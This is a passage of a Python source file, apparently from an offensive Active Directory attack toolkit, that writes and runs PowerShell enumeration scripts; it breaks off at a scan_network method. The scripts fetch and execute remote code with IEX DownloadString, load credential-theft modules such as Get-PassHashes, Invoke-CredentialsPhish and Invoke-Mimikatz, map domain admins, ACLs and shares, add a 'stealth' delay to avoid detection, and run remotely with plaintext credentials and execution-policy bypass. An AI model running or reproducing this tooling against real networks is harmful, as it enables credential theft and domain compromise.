#!/usr/bin/env python3
import argparse
import subprocess
import os
import sys
import json
import base64
import re
import threading
import time
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Any, Optional, Tuple, Set

from utils import Colors, Logger, execute_command, save_results

# Import shared configuration
try:
    from config import (
        TARGETS, DOMAIN_USERS, DOMAIN_PASSWORDS, NTLM_HASHES,
        LOG_DIRECTORY, RESULTS_DIRECTORY
    )
except ImportError:
    print("Error: config.py not found. Please ensure it exists in the current directory.")
    sys.exit(1)

class PSScripts:
    """PowerShell scripts for enumeration"""
    
    @staticmethod
    def create_enum_script_directory() -> Path:
        """Create scripts directory if it doesn't exist"""
        # Use absolute path relative to the current script
        base_dir = Path(__file__).parent.absolute()
        script_dir = base_dir / "scripts" / "enumeration"
        script_dir.mkdir(parents=True, exist_ok=True)
        return script_dir
        
    @staticmethod
    def get_powerview_script() -> Path:
        """Write PowerView.ps1 to disk if it doesn't exist"""
        script_dir = PSScripts.create_enum_script_directory()
        powerview_path = script_dir / "PowerView.ps1"
        
        if not powerview_path.exists():
            # Write a condensed version of PowerView.ps1
            with open(powerview_path, 'w') as f:
                f.write("""# PowerView.ps1
# Import this script if it exists in the environment or download it
$powerViewPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PowerView\\PowerView.ps1"

if (Test-Path $powerViewPath) {
    . $powerViewPath
} else {
    # If PowerView is not installed, try to download it
    try {
        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')
        Write-Output "PowerView loaded successfully."
    } catch {
        Write-Error "Failed to download PowerView. Error: $_"
    }
}
""")
        
        return powerview_path
    
    @staticmethod
    def get_ad_module_script() -> Path:
        """Write AD module loading script to disk if it doesn't exist"""
        script_dir = PSScripts.create_enum_script_directory()
        ad_module_path = script_dir / "ADModule.ps1"
        
        if not ad_module_path.exists():
            with open(ad_module_path, 'w') as f:
                f.write("""# ADModule.ps1
# Import the AD module if it exists
if (Get-Module -ListAvailable -Name ActiveDirectory) {
    Import-Module ActiveDirectory
    Write-Output "Active Directory module loaded successfully."
} else {
    Write-Error "Active Directory module not found on this system."
}
""")
        
        return ad_module_path
    
    @staticmethod
    def get_network_scanner_script() -> Path:
        """Write Network Scanner script to disk if it doesn't exist"""
        script_dir = PSScripts.create_enum_script_directory()
        network_scanner_path = script_dir / "NetworkScanner.ps1"
        
        if not network_scanner_path.exists():
            with open(network_scanner_path, 'w') as f:
                f.write("""# NetworkScanner.ps1
# Simple multi-threaded network scanner

function Scan-IPRange {
    param (
        [Parameter(Mandatory=$true)]
        [string]$StartIP,
        
        [Parameter(Mandatory=$true)]
        [string]$EndIP,
        
        [Parameter(Mandatory=$false)]
        [int]$Threads = 100,
        
        [Parameter(Mandatory=$false)]
        [int]$Timeout = 100
    )
    
    function Convert-IPToInt {
        param ([string]$IP)
        $octets = $IP.Split(".")
        return ([int]$octets[0] * 16777216) + ([int]$octets[1] * 65536) + ([int]$octets[2] * 256) + [int]$octets[3]
    }
    
    function Convert-IntToIP {
        param ([int]$Int)
        $octet1 = [Math]::Truncate($Int / 16777216)
        $remainder = $Int % 16777216
        $octet2 = [Math]::Truncate($remainder / 65536)
        $remainder = $remainder % 65536
        $octet3 = [Math]::Truncate($remainder / 256)
        $octet4 = $remainder % 256
        return "$octet1.$octet2.$octet3.$octet4"
    }
    
    $startInt = Convert-IPToInt -IP $StartIP
    $endInt = Convert-IPToInt -IP $EndIP
    
    $ipRange = @()
    for ($i = $startInt; $i -le $endInt; $i++) {
        $ipRange += Convert-IntToIP -Int $i
    }
    
    $totalIPs = $ipRange.Count
    $results = @()
    $resultLock = [System.Object]::new()
    $counter = 0
    $counterLock = [System.Object]::new()
    
    $scriptBlock = {
        param ($ip, $timeout)
        
        $result = [PSCustomObject]@{
            IP = $ip
            Status = "Down"
            HostName = ""
        }
        
        if (Test-Connection -ComputerName $ip -Count 1 -Quiet -TimeoutSeconds $timeout) {
            $result.Status = "Up"
            try {
                $result.HostName = [System.Net.Dns]::GetHostByAddress($ip).HostName
            } catch {
                $result.HostName = "Unable to resolve"
            }
        }
        
        return $result
    }
    
    $jobs = @()
    
    foreach ($ip in $ipRange) {
        while (@($jobs | Where-Object { $_.State -eq 'Running' }).Count -ge $Threads) {
            Start-Sleep -Milliseconds 100
            
            foreach ($job in ($jobs | Where-Object { $_.State -eq 'Completed' })) {
                $result = Receive-Job -Job $job
                
                if ($result) {
                    [lock]$resultLock {
                        $results += $result
                    }
                    
                    [lock]$counterLock {
                        $counter++
                        $progress = [Math]::Round(($counter / $totalIPs) * 100, 2)
                        Write-Progress -Activity "Scanning IP Range" -Status "$counter of $totalIPs IPs scanned" -PercentComplete $progress
                    }
                }
                
                Remove-Job -Job $job
                $jobs = $jobs | Where-Object { $_ -ne $job }
            }
        }
        
        $job = Start-Job -ScriptBlock $scriptBlock -ArgumentList $ip, $timeout
        $jobs += $job
    }
    
    while (@($jobs | Where-Object { $_.State -eq 'Running' }).Count -gt 0) {
        Start-Sleep -Milliseconds 100
        
        foreach ($job in ($jobs | Where-Object { $_.State -eq 'Completed' })) {
            $result = Receive-Job -Job $job
            
            if ($result) {
                [lock]$resultLock {
                    $results += $result
                }
                
                [lock]$counterLock {
                    $counter++
                    $progress = [Math]::Round(($counter / $totalIPs) * 100, 2)
                    Write-Progress -Activity "Scanning IP Range" -Status "$counter of $totalIPs IPs scanned" -PercentComplete $progress
                }
            }
            
            Remove-Job -Job $job
            $jobs = $jobs | Where-Object { $_ -ne $job }
        }
    }
    
    Write-Progress -Activity "Scanning IP Range" -Completed
    return $results | Sort-Object IP
}

function Scan-Network {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Subnet,
        
        [Parameter(Mandatory=$false)]
        [int]$Threads = 100,
        
        [Parameter(Mandatory=$false)]
        [int]$Timeout = 100
    )
    
    if ($Subnet -match "^(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})\\.\\d{1,3}/\\d{1,2}$") {
        $networkPortion = $Matches[1]
        $cidr = $Subnet.Split('/')[1]
        
        # Calculate IP range from CIDR
        $subnetMask = [math]::pow(2, 32) - [math]::pow(2, 32 - [int]$cidr)
        $subnetIP = [System.Net.IPAddress]::Parse("$networkPortion.0").Address -band $subnetMask
        $broadcastIP = $subnetIP -bor ([math]::pow(2, 32 - [int]$cidr) - 1)
        
        $startIP = [System.Net.IPAddress]($subnetIP + 1)
        $endIP = [System.Net.IPAddress]($broadcastIP - 1)
        
        return Scan-IPRange -StartIP $startIP.ToString() -EndIP $endIP.ToString() -Threads $Threads -Timeout $Timeout
    }
    elseif ($Subnet -match "^(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})\\.(\\d{1,3})-(\\d{1,3})$") {
        $networkPortion = $Matches[1]
        $startOctet = $Matches[2]
        $endOctet = $Matches[3]
        
        $startIP = "$networkPortion.$startOctet"
        $endIP = "$networkPortion.$endOctet"
        
        return Scan-IPRange -StartIP $startIP -EndIP $endIP -Threads $Threads -Timeout $Timeout
    }
    else {
        Write-Error "Invalid subnet format. Use either CIDR (e.g. 192.168.1.0/24) or range (e.g. 192.168.1.1-254)"
        return @()
    }
}

# Export functions
Export-ModuleMember -Function Scan-IPRange, Scan-Network
""")
        
        return network_scanner_path
    
    @staticmethod
    def get_nishang_enumeration_script() -> Path:
        """Write Nishang enumeration script to disk if it doesn't exist"""
        script_dir = PSScripts.create_enum_script_directory()
        nishang_path = script_dir / "NishangEnum.ps1"
        
        if not nishang_path.exists():
            with open(nishang_path, 'w') as f:
                f.write("""# NishangEnum.ps1
# Load Nishang enumeration scripts if available or fetch them

function Load-NishangModule {
    param (
        [Parameter(Mandatory=$true)]
        [string]$ModuleName
    )
    
    $nishangPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Nishang\\$ModuleName.ps1"
    
    if (Test-Path $nishangPath) {
        . $nishangPath
        Write-Output "Nishang module $ModuleName loaded successfully."
        return $true
    } else {
        # If Nishang is not installed, try to download specific modules
        try {
            $url = "https://raw.githubusercontent.com/samratashok/nishang/master/Gather/$ModuleName.ps1"
            IEX (New-Object Net.WebClient).DownloadString($url)
            Write-Output "Nishang module $ModuleName downloaded and loaded successfully."
            return $true
        } catch {
            Write-Error "Failed to download Nishang module $ModuleName. Error: $_"
            return $false
        }
    }
}

# Try to load key Nishang modules
$modules = @(
    "Get-Information",
    "Get-PassHashes",
    "Get-WLAN-Keys",
    "Get-WebCredentials",
    "Invoke-CredentialsPhish",
    "Invoke-MimikatzWdigestDowngrade",
    "Invoke-Mimikatz"
)

foreach ($module in $modules) {
    Load-NishangModule -ModuleName $module
}
""")
        
        return nishang_path
    
    @staticmethod
    def get_enum_domain_script() -> Path:
        """Write domain enumeration script to disk if it doesn't exist"""
        script_dir = PSScripts.create_enum_script_directory()
        domain_enum_path = script_dir / "EnumDomain.ps1"
        
        if not domain_enum_path.exists():
            with open(domain_enum_path, 'w') as f:
                f.write("""# EnumDomain.ps1
# Domain enumeration script that uses both PowerView and AD Module

# First try to load PowerView
$powerViewLoaded = $false
$adModuleLoaded = $false

try {
    # Try to import PowerView
    . "$PSScriptRoot\\PowerView.ps1"
    $powerViewLoaded = $true
    Write-Output "PowerView loaded successfully"
} catch {
    Write-Warning "Failed to load PowerView: $_"
}

try {
    # Try to import AD Module
    . "$PSScriptRoot\\ADModule.ps1"
    $adModuleLoaded = $true
    Write-Output "AD Module loaded successfully"
} catch {
    Write-Warning "Failed to load AD Module: $_"
}

function Get-DomainDetails {
    $result = @{
        Forest = $null
        Domain = $null
        DCs = @()
        Trusts = @()
        FSMO = @{}
    }
    
    if ($adModuleLoaded) {
        try {
            $result.Forest = Get-ADForest
            $result.Domain = Get-ADDomain
            $result.DCs = Get-ADDomainController -Filter *
            $result.Trusts = Get-ADTrust -Filter *
            
            # FSMO roles
            $result.FSMO.PDCEmulator = $result.Domain.PDCEmulator
            $result.FSMO.RIDMaster = $result.Domain.RIDMaster
            $result.FSMO.InfrastructureMaster = $result.Domain.InfrastructureMaster
            $result.FSMO.SchemaMaster = $result.Forest.SchemaMaster
            $result.FSMO.DomainNamingMaster = $result.Forest.DomainNamingMaster
        } catch {
            Write-Warning "Error getting domain details with AD Module: $_"
        }
    } elseif ($powerViewLoaded) {
        try {
            $result.Domain = Get-Domain
            $result.Forest = Get-ForestDomain
            $result.DCs = Get-DomainController
            $result.Trusts = Get-DomainTrust
            
            # FSMO roles can't be directly queried with PowerView
            # Use WMI/CIM as a fallback
            $pdcRole = Get-WmiObject -Namespace "root\\directory\\ldap" -Class ds_pdcroleowner
            if ($pdcRole) {
                $result.FSMO.PDCEmulator = $pdcRole.ds_pdcroleowner
            }
        } catch {
            Write-Warning "Error getting domain details with PowerView: $_"
        }
    } else {
        Write-Error "Neither PowerView nor AD Module could be loaded. Cannot enumerate domain."
    }
    
    return $result
}

function Get-DomainUsers {
    param (
        [Parameter(Mandatory=$false)]
        [switch]$AdminOnly,
        
        [Parameter(Mandatory=$false)]
        [switch]$EnabledOnly,
        
        [Parameter(Mandatory=$false)]
        [int]$Limit = 0
    )
    
    $users = @()
    
    if ($adModuleLoaded) {
        try {
            $filter = "*"
            if ($AdminOnly) {
                $filter = "adminCount -eq 1"
            }
            if ($EnabledOnly) {
                if ($filter -ne "*") {
                    $filter += " -and Enabled -eq `$true"
                } else {
                    $filter = "Enabled -eq `$true"
                }
            }
            
            if ($Limit -gt 0) {
                $users = Get-ADUser -Filter $filter -Properties * -ResultSetSize $Limit
            } else {
                $users = Get-ADUser -Filter $filter -Properties *
            }
        } catch {
            Write-Warning "Error getting domain users with AD Module: $_"
        }
    } elseif ($powerViewLoaded) {
        try {
            $args = @{}
            if ($AdminOnly) {
                $args["AdminCount"] = $true
            }
            
            $pvUsers = Get-DomainUser @args -Properties *
            
            if ($EnabledOnly) {
                $pvUsers = $pvUsers | Where-Object { $_.useraccountcontrol -notmatch 'ACCOUNTDISABLE' }
            }
            
            if ($Limit -gt 0) {
                $users = $pvUsers | Select-Object -First $Limit
            } else {
                $users = $pvUsers
            }
        } catch {
            Write-Warning "Error getting domain users with PowerView: $_"
        }
    } else {
        Write-Error "Neither PowerView nor AD Module could be loaded. Cannot enumerate users."
    }
    
    return $users
}

function Get-DomainGroups {
    param (
        [Parameter(Mandatory=$false)]
        [switch]$PrivilegedOnly,
        
        [Parameter(Mandatory=$false)]
        [int]$Limit = 0
    )
    
    $groups = @()
    
    if ($adModuleLoaded) {
        try {
            $filter = "*"
            if ($PrivilegedOnly) {
                $filter = "adminCount -eq 1"
            }
            
            if ($Limit -gt 0) {
                $groups = Get-ADGroup -Filter $filter -Properties * -ResultSetSize $Limit
            } else {
                $groups = Get-ADGroup -Filter $filter -Properties *
            }
        } catch {
            Write-Warning "Error getting domain groups with AD Module: $_"
        }
    } elseif ($powerViewLoaded) {
        try {
            $args = @{}
            if ($PrivilegedOnly) {
                $args["AdminCount"] = $true
            }
            
            $pvGroups = Get-DomainGroup @args -Properties *
            
            if ($Limit -gt 0) {
                $groups = $pvGroups | Select-Object -First $Limit
            } else {
                $groups = $pvGroups
            }
        } catch {
            Write-Warning "Error getting domain groups with PowerView: $_"
        }
    } else {
        Write-Error "Neither PowerView nor AD Module could be loaded. Cannot enumerate groups."
    }
    
    return $groups
}

function Get-DomainComputers {
    param (
        [Parameter(Mandatory=$false)]
        [switch]$ServersOnly,
        
        [Parameter(Mandatory=$false)]
        [switch]$DCsOnly,
        
        [Parameter(Mandatory=$false)]
        [int]$Limit = 0
    )
    
    $computers = @()
    
    if ($adModuleLoaded) {
        try {
            $filter = "*"
            if ($ServersOnly) {
                $filter = "OperatingSystem -like '*server*'"
            }
            if ($DCsOnly) {
                $filter = "PrimaryGroupID -eq 516"
            }
            
            if ($Limit -gt 0) {
                $computers = Get-ADComputer -Filter $filter -Properties * -ResultSetSize $Limit
            } else {
                $computers = Get-ADComputer -Filter $filter -Properties *
            }
        } catch {
            Write-Warning "Error getting domain computers with AD Module: $_"
        }
    } elseif ($powerViewLoaded) {
        try {
            $args = @{}
            if ($ServersOnly) {
                $args["OperatingSystem"] = "*server*"
            }
            
            $pvComputers = Get-DomainComputer @args -Properties *
            
            if ($DCsOnly) {
                $pvComputers = $pvComputers | Where-Object { $_.useraccountcontrol -match 'SERVER_TRUST_ACCOUNT' }
            }
            
            if ($Limit -gt 0) {
                $computers = $pvComputers | Select-Object -First $Limit
            } else {
                $computers = $pvComputers
            }
        } catch {
            Write-Warning "Error getting domain computers with PowerView: $_"
        }
    } else {
        Write-Error "Neither PowerView nor AD Module could be loaded. Cannot enumerate computers."
    }
    
    return $computers
}

function Get-DomainGPOs {
    param (
        [Parameter(Mandatory=$false)]
        [string]$Name = "*",
        
        [Parameter(Mandatory=$false)]
        [int]$Limit = 0
    )
    
    $gpos = @()
    
    if ($adModuleLoaded) {
        try {
            $filter = "Name -like '$Name'"
            
            if ($Limit -gt 0) {
                $gpos = Get-ADGroupPolicy -Filter $filter -ResultSetSize $Limit
            } else {
                $gpos = Get-ADGroupPolicy -Filter $filter
            }
        } catch {
            Write-Warning "Error getting domain GPOs with AD Module: $_"
        }
    } elseif ($powerViewLoaded) {
        try {
            $pvGPOs = Get-DomainGPO -Identity $Name
            
            if ($Limit -gt 0) {
                $gpos = $pvGPOs | Select-Object -First $Limit
            } else {
                $gpos = $pvGPOs
            }
        } catch {
            Write-Warning "Error getting domain GPOs with PowerView: $_"
        }
    } else {
        Write-Error "Neither PowerView nor AD Module could be loaded. Cannot enumerate GPOs."
    }
    
    return $gpos
}

function Get-DomainAdmins {
    $admins = @()
    
    if ($adModuleLoaded) {
        try {
            $domainAdminsSID = (Get-ADDomain).DomainSID.Value + "-512"
            $admins = Get-ADGroupMember -Identity $domainAdminsSID -Recursive | Get-ADUser -Properties *
        } catch {
            Write-Warning "Error getting domain admins with AD Module: $_"
        }
    } elseif ($powerViewLoaded) {
        try {
            $admins = Get-DomainGroupMember -Identity "Domain Admins" -Recurse | ForEach-Object {
                Get-DomainUser -Identity $_.MemberName -Properties *
            }
        } catch {
            Write-Warning "Error getting domain admins with PowerView: $_"
        }
    } else {
        Write-Error "Neither PowerView nor AD Module could be loaded. Cannot enumerate domain admins."
    }
    
    return $admins
}

function Get-DomainShares {
    param (
        [Parameter(Mandatory=$false)]
        [string[]]$ComputerNames
    )
    
    $shares = @()
    
    if (-not $ComputerNames) {
        Write-Warning "No computer names provided for share enumeration."
        return $shares
    }
    
    foreach ($computer in $ComputerNames) {
        try {
            $computerShares = Get-WmiObject -Class Win32_Share -ComputerName $computer |
                Select-Object Name, Path, Description, @{Name="ComputerName"; Expression={$computer}}
            $shares += $computerShares
        } catch {
            Write-Warning "Error getting shares on $computer`: $_"
        }
    }
    
    return $shares
}

function Get-DomainACL {
    param (
        [Parameter(Mandatory=$false)]
        [string]$ObjectDN
    )
    
    $acls = @()
    
    if ($powerViewLoaded) {
        try {
            if ($ObjectDN) {
                $acls = Get-DomainObjectAcl -Identity $ObjectDN
            } else {
                $acls = Get-DomainObjectAcl -ResolveGUIDs
            }
        } catch {
            Write-Warning "Error getting domain ACLs with PowerView: $_"
        }
    } else {
        Write-Error "PowerView could not be loaded. Cannot enumerate ACLs."
    }
    
    return $acls
}

# Export functions for use in other scripts
Export-ModuleMember -Function Get-DomainDetails, Get-DomainUsers, Get-DomainGroups, Get-DomainComputers, Get-DomainGPOs, Get-DomainAdmins, Get-DomainShares, Get-DomainACL
""")
        
        return domain_enum_path
    
    @staticmethod
    def get_enum_wrapper_script() -> Path:
        """Write enumeration wrapper script to disk if it doesn't exist"""
        script_dir = PSScripts.create_enum_script_directory()
        wrapper_path = script_dir / "EnumWrapper.ps1"
        
        if not wrapper_path.exists():
            with open(wrapper_path, 'w') as f:
                f.write("""# EnumWrapper.ps1
# Wrapper script to call all enumeration functions and export results

param (
    [Parameter(Mandatory=$false)]
    [string]$OutputPath = "C:\\Windows\\Temp\\ADEnum",
    
    [Parameter(Mandatory=$false)]
    [switch]$Stealth = $false,
    
    [Parameter(Mandatory=$false)]
    [int]$ThreadLimit = 10,
    
    [Parameter(Mandatory=$false)]
    [switch]$SkipNetworkScan = $false,
    
    [Parameter(Mandatory=$false)]
    [switch]$SkipShareScan = $false,
    
    [Parameter(Mandatory=$false)]
    [string]$Subnet = "",
    
    [Parameter(Mandatory=$false)]
    [int]$UserLimit = 1000,
    
    [Parameter(Mandatory=$false)]
    [int]$GroupLimit = 1000,
    
    [Parameter(Mandatory=$false)]
    [int]$ComputerLimit = 1000
)

# Load the required scripts
. "$PSScriptRoot\\EnumDomain.ps1"
. "$PSScriptRoot\\NetworkScanner.ps1"

# Create output directory if it doesn't exist
if (-not (Test-Path $OutputPath)) {
    New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null
}

$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$outputDir = Join-Path $OutputPath $timestamp
New-Item -ItemType Directory -Path $outputDir -Force | Out-Null

Write-Output "Starting AD enumeration. Results will be saved to $outputDir"

# Set execution parameters
$runspacePool = $null
if ($ThreadLimit -gt 0) {
    $runspacePool = [runspacefactory]::CreateRunspacePool(1, $ThreadLimit)
    $runspacePool.Open()
}

# Random delay function for stealth mode
function Get-RandomDelay {
    if ($Stealth) {
        $delay = Get-Random -Minimum 100 -Maximum 5000
        Start-Sleep -Milliseconds $delay
    }
}

# 1. Domain Information
Write-Output "Enumerating domain details..."
Get-RandomDelay
$domainDetails = Get-DomainDetails
$domainDetails | ConvertTo-Json -Depth 10 | Out-File "$outputDir\\domain_details.json"
Write-Output "Domain details saved to $outputDir\\domain_details.json"

# 2. Domain Controllers
Write-Output "Enumerating domain controllers..."
Get-RandomDelay
$domainControllers = $domainDetails.DCs
$domainControllers | ConvertTo-Json -Depth 10 | Out-File "$outputDir\\domain_controllers.json"
Write-Output "Domain controllers saved to $outputDir\\domain_controllers.json"

# 3. Users
Write-Output "Enumerating domain users..."
Get-RandomDelay
$users = Get-DomainUsers -Limit $UserLimit
$users | ConvertTo-Json -Depth 5 | Out-File "$outputDir\\domain_users.json"
Write-Output "Domain users saved to $outputDir\\domain_users.json"

# 4. Admin users
Write-Output "Enumerating admin users..."
Get-RandomDelay
$adminUsers = Get-DomainUsers -AdminOnly
$adminUsers | ConvertTo-Json -Depth 5 | Out-File "$outputDir\\admin_users.json"
Write-Output "Admin users saved to $outputDir\\admin_users.json"

# 5. Domain Admins
Write-Output "Enumerating Domain Admins..."
Get-RandomDelay
$domainAdmins = Get-DomainAdmins
$domainAdmins | ConvertTo-Json -Depth 5 | Out-File "$outputDir\\domain_admins.json"
Write-Output "Domain Admins saved to $outputDir\\domain_admins.json"

# 6. Groups
Write-Output "Enumerating domain groups..."
Get-RandomDelay
$groups = Get-DomainGroups -Limit $GroupLimit
$groups | ConvertTo-Json -Depth 5 | Out-File "$outputDir\\domain_groups.json"
Write-Output "Domain groups saved to $outputDir\\domain_groups.json"

# 7. Privileged Groups
Write-Output "Enumerating privileged groups..."
Get-RandomDelay
$privGroups = Get-DomainGroups -PrivilegedOnly
$privGroups | ConvertTo-Json -Depth 5 | Out-File "$outputDir\\privileged_groups.json"
Write-Output "Privileged groups saved to $outputDir\\privileged_groups.json"

# 8. Computers
Write-Output "Enumerating domain computers..."
Get-RandomDelay
$computers = Get-DomainComputers -Limit $ComputerLimit
$computers | ConvertTo-Json -Depth 5 | Out-File "$outputDir\\domain_computers.json"
Write-Output "Domain computers saved to $outputDir\\domain_computers.json"

# 9. Servers
Write-Output "Enumerating domain servers..."
Get-RandomDelay
$servers = Get-DomainComputers -ServersOnly
$servers | ConvertTo-Json -Depth 5 | Out-File "$outputDir\\domain_servers.json"
Write-Output "Domain servers saved to $outputDir\\domain_servers.json"

# 10. GPOs
Write-Output "Enumerating GPOs..."
Get-RandomDelay
$gpos = Get-DomainGPOs
$gpos | ConvertTo-Json -Depth 10 | Out-File "$outputDir\\domain_gpos.json"
Write-Output "GPOs saved to $outputDir\\domain_gpos.json"

# 11. Network scan if subnet provided
if (-not $SkipNetworkScan -and $Subnet -ne "") {
    Write-Output "Scanning network subnet $Subnet..."
    Get-RandomDelay
    $networkScan = Scan-Network -Subnet $Subnet -Threads $ThreadLimit
    $networkScan | ConvertTo-Json | Out-File "$outputDir\\network_scan.json"
    Write-Output "Network scan saved to $outputDir\\network_scan.json"
}

# 12. Share enumeration if not skipped
if (-not $SkipShareScan) {
    Write-Output "Enumerating shares on domain computers..."
    
    # Get a list of computer names
    $computerNames = @()
    if ($servers) {
        $computerNames = $servers | Select-Object -ExpandProperty Name
    } else {
        $computerNames = $computers | Select-Object -ExpandProperty Name
    }
    
    # Limit to first 20 computers for faster results, if there are many
    if ($computerNames.Count -gt 20) {
        $computerNames = $computerNames | Select-Object -First 20
    }
    
    Get-RandomDelay
    $shares = Get-DomainShares -ComputerNames $computerNames
    $shares | ConvertTo-Json | Out-File "$outputDir\\computer_shares.json"
    Write-Output "Computer shares saved to $outputDir\\computer_shares.json"
}

# 13. ACL enumeration for sensitive objects
Write-Output "Enumerating ACLs for sensitive objects..."
Get-RandomDelay
$acls = Get-DomainACL
$acls | ConvertTo-Json -Depth 5 | Out-File "$outputDir\\domain_acls.json"
Write-Output "Domain ACLs saved to $outputDir\\domain_acls.json"

# Clean up runspace pool if it was created
if ($runspacePool) {
    $runspacePool.Close()
    $runspacePool.Dispose()
}

Write-Output "AD enumeration complete. All results saved to $outputDir"
""")
        
        return wrapper_path

class PowerShellEnumeration:
    def __init__(self):
        # Use absolute path for results directory
        base_dir = Path(__file__).parent.absolute()
        self.results_dir = base_dir / RESULTS_DIRECTORY / "ad_enumeration"
        self.results_dir.mkdir(parents=True, exist_ok=True)
        self.ps_scripts_dir = PSScripts.create_enum_script_directory()
        self.start_time = None
        self.end_time = None
        
        # Ensure all PowerShell scripts are created
        self.powerview_script = PSScripts.get_powerview_script()
        self.ad_module_script = PSScripts.get_ad_module_script()
        self.network_scanner_script = PSScripts.get_network_scanner_script()
        self.nishang_script = PSScripts.get_nishang_enumeration_script()
        self.enum_domain_script = PSScripts.get_enum_domain_script()
        self.enum_wrapper_script = PSScripts.get_enum_wrapper_script()
        
    def execute_command(self, command: str, description: str) -> str:
        """Execute a shell command and return its output"""
        try:
            Logger.command(command)
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout if result.stdout else result.stderr
            
            if result.returncode == 0:
                if output.strip():
                    Logger.success(f"Successfully completed: {description}")
                else:
                    Logger.info("Command completed but no output returned")
            else:
                Logger.error(f"Command failed: {output}")
                
            return output
        except Exception as e:
            Logger.error(f"Error executing command: {str(e)}")
            return str(e)
    
    def save_results(self, target: str, output: str, module: str) -> Path:
        """Save command results to a file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{target.replace('.', '_')}_{module}_{timestamp}.txt"
        filepath = self.results_dir / filename
        
        with open(filepath, 'w') as f:
            f.write(output)
        
        Logger.success(f"Results saved to {filepath}")
        return filepath
    
    def save_json_results(self, target: str, data: dict, module: str) -> Path:
        """Save JSON results to a file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{target.replace('.', '_')}_{module}_{timestamp}.json"
        filepath = self.results_dir / filename
        
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=4)
        
        Logger.success(f"Results saved to {filepath}")
        return filepath
    
    def create_ps_execution_script(self, ps_script_path: Path, args: dict = None) -> Path:
        """Create a PowerShell execution script"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"execute_{timestamp}.ps1"
        filepath = self.ps_scripts_dir / filename
        
        # Build arguments string
        args_str = ""
        if args:
            for key, value in args.items():
                if isinstance(value, bool):
                    if value:
                        args_str += f" -{key}"
                elif isinstance(value, int) or isinstance(value, float):
                    args_str += f" -{key} {value}"
                else:
                    args_str += f" -{key} '{value}'"
        
        # Create the script
        with open(filepath, 'w') as f:
            f.write(f"""# Auto-generated execution script
try {{
    . "{ps_script_path}"{args_str}
    Write-Output "Script executed successfully."
}} catch {{
    Write-Error "Error executing script: $_"
}}
""")
        
        return filepath
    
    def execute_powershell_remote(self, target: str, username: str, password: str, script_path: Path) -> str:
        """Execute a PowerShell script on a remote system"""
        ps_command = f"powershell -ep bypass -command \"$pw = ConvertTo-SecureString '{password}' -AsPlainText -Force; "
        ps_command += f"$cred = New-Object System.Management.Automation.PSCredential('{username}', $pw); "
        ps_command += f"Invoke-Command -ComputerName {target} -Credential $cred -FilePath '{script_path}'\""
        
        output = self.execute_command(ps_command, f"Executing PowerShell script remotely on {target}")
        return output
    
    def execute_powershell_local(self, script_path: Path) -> str:
        """Execute a PowerShell script locally"""
        ps_command = f"powershell -ep bypass -File \"{script_path}\""
        output = self.execute_command(ps_command, f"Executing PowerShell script locally")
        return output
    
    def enum_domain_local(self, stealth: bool = False, thread_limit: int = 10, subnet: str = None, output_dir: str = None) -> Dict[str, Any]:
        """Enumerate the domain from the local system"""
        Logger.section("Enumerating Active Directory from Local System")
        
        # Prepare arguments
        args = {
            "Stealth": stealth,
            "ThreadLimit": thread_limit
        }
        
        if subnet:
            args["Subnet"] = subnet
        
        if output_dir:
            args["OutputPath"] = output_dir
        else:
            args["OutputPath"] = str(self.results_dir)
        
        # Create execution script
        exec_script = self.create_ps_execution_script(self.enum_wrapper_script, args)
        
        # Execute the script
        output = self.execute_powershell_local(exec_script)
        
        # Save the raw output
        self.save_results("local", output, "domain_enum")
        
        # Process the results
        Logger.info("Processing enumeration results...")
        
        # Find the output directory path in the script output
        output_dir_match = re.search(r"All results saved to (.+)$", output, re.MULTILINE)
        result_path = None
        
        if output_dir_match:
            result_path = output_dir_match.group(1).strip()
            Logger.success(f"Results stored in: {result_path}")
            
            # Try to copy all results to our results directory if they're in a different location
            if Path(result_path).exists() and Path(result_path) != self.results_dir:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                target_dir = self.results_dir / f"domain_enum_{timestamp}"
                target_dir.mkdir(exist_ok=True)
                
                try:
                    self.execute_command(f"powershell -command \"Copy-Item -Path '{result_path}\\*' -Destination '{target_dir}' -Recurse\"",
                                       "Copying results to central location")
                    Logger.success(f"Results copied to: {target_dir}")
                except Exception as e:
                    Logger.error(f"Error copying results: {str(e)}")
        
        return {
            "output": output,
            "result_path": result_path
        }
    
    def enum_domain_remote(self, target: str, username: str, password: str, stealth: bool = False, thread_limit: int = 5, skip_network_scan: bool = True) -> Dict[str, Any]:
        """Enumerate the domain from a remote system"""
        Logger.section(f"Enumerating Active Directory from Remote System: {target}")
        
        # Prepare arguments - more conservative for remote execution
        args = {
            "Stealth": stealth,
            "ThreadLimit": thread_limit,
            "SkipNetworkScan": skip_network_scan,
            "UserLimit": 100,
            "GroupLimit": 100,
            "ComputerLimit": 100
        }
        
        # Use Windows temp directory for output on remote system
        args["OutputPath"] = "C:\\Windows\\Temp\\ADEnum"
        
        # Create execution script
        exec_script = self.create_ps_execution_script(self.enum_wrapper_script, args)
        
        # Execute the script remotely
        output = self.execute_powershell_remote(target, username, password, exec_script)
        
        # Save the raw output
        self.save_results(target, output, "domain_enum")
        
        # Process the results
        Logger.info("Processing enumeration results...")
        
        # Find the output directory path in the script output
        output_dir_match = re.search(r"All results saved to (.+)$", output, re.MULTILINE)
        result_path = None
        
        if output_dir_match:
            result_path = output_dir_match.group(1).strip()
            Logger.success(f"Results stored on remote system: {result_path}")
            
            # We can't directly access the remote files, so we need to establish a session and download them
            # This is left as a manual step for the operator
            Logger.info(f"To retrieve results, establish an SMB session to {target} and download files from {result_path}")
        
        return {
            "output": output,
            "result_path": result_path
        }
    
    def scan_network(self, subnet: str, threads: int = 20) -> Dict[str, Any]:
